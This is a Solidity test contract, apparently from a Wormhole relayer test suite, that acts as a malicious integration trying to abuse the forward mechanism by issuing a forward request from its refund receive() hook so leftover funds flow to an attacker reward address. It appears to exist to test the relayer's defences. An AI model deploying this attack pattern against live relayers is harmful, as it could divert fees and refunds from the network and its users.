// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "../../contracts/interfaces/IWormhole.sol";
import "../../contracts/interfaces/relayer/IWormholeReceiver.sol";
import "../../contracts/interfaces/relayer/IWormholeRelayer.sol";

import {toWormholeFormat} from "../../contracts/libraries/relayer/Utils.sol";

/**
 * This contract is a malicious "integration" that attempts to attack the forward mechanism.
 */
contract AttackForwardIntegration is IWormholeReceiver {
    address attackerReward;
    IWormhole immutable wormhole;
    IWormholeRelayer immutable coreRelayer;
    uint16 targetChainId;

    // Capture 30k gas for fees
    // This just needs to be enough to pay for the call to the destination address.
    uint32 SAFE_DELIVERY_GAS_CAPTURE = 30_000;

    constructor(
        IWormhole initWormhole,
        IWormholeRelayer initCoreRelayer,
        uint16 chainId,
        address initAttackerReward
    ) {
        wormhole = initWormhole;
        attackerReward = initAttackerReward;
        coreRelayer = initCoreRelayer;
        targetChainId = chainId;
    }

    // This is the function which receives all messages from the remote contracts.
    function receiveWormholeMessages(
        DeliveryData memory deliveryData,
        bytes[] memory vaas
    ) public payable override {
        // Do nothing. The attacker doesn't care about this message; he sends it himself.
    }

    receive() external payable {
        // Request forward from the relayer network
        // The core relayer could in principle accept the request due to this being the target of the message at the same time as being the refund address.
        // Note that, if succesful, this forward request would be processed after the time for processing forwards is past.
        // Thus, the request would "linger" in the forward request cache and be attended to in the next delivery.
        forward(targetChainId, attackerReward);
    }

    function forward(uint16 _targetChainId, address attackerRewardAddress) internal {
        (uint256 deliveryPayment,) = coreRelayer.quoteEVMDeliveryPrice(
            _targetChainId, 0, SAFE_DELIVERY_GAS_CAPTURE
        );

        bytes memory payload = new bytes(0);
        coreRelayer.forwardToEvm{value: deliveryPayment + wormhole.messageFee()}(
            _targetChainId,
            attackerRewardAddress,
            payload,
            // receiver value
            Wei.wrap(0),
            Gas.wrap(SAFE_DELIVERY_GAS_CAPTURE),
            _targetChainId,
            // All remaining funds will be returned to the attacker through a refund
            attackerRewardAddress
        );
    }
}